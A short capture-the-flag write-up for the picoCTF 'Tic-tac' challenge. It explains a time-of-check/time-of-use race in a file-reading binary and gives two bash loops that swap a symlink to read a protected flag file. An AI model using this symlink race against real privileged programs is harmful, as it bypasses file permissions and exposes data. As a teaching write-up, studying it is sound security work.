---
title: "Tic-tac"
date: "2025-08-04"
tags: ["picoCTF", "race condition"]
---

In this challenge they give us the credentials to a shell with a binary in it.

The binary has this code:

```c
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

The program prints a file to the screen, and I want that file to be the flag, as long as I make it to the last part of the code. The catch is there is a check for whether I own the file, and if I do not, the program exits. To solve this challenge I have to bypass that check. Here is how:

First, while the program flow is checking the owner, hand it a file I do own. Second, once the check is done and before it prints the file I passed it, switch it to flag.txt. I can do this with 2 scripts running in an infinite loop and symbolic links, like this:

```bash
# Script 1

while true; do
    ln -sf ./hola.txt enlace
    ln -sf ./flag.txt enlace
done
```

This one keeps swapping the link back and forth between my file and the real one.

> The file hola.txt has to be created beforehand

```bash
# Script 2

while true; do
    ./txtreader enlace
done
```

This one keeps running the binary, passing it the link that keeps changing.

Sooner or later one of the runs lines up with the swap at the right moment, and I get the flag:

```c
./ejecutar_programa.sh 
. . .
Error: you don't own this file
Error: you don't own this file
picoCTF{SECRET}
Error: you don't own this file
Error: you don't own this file
. . .
```

Thanks for reading!
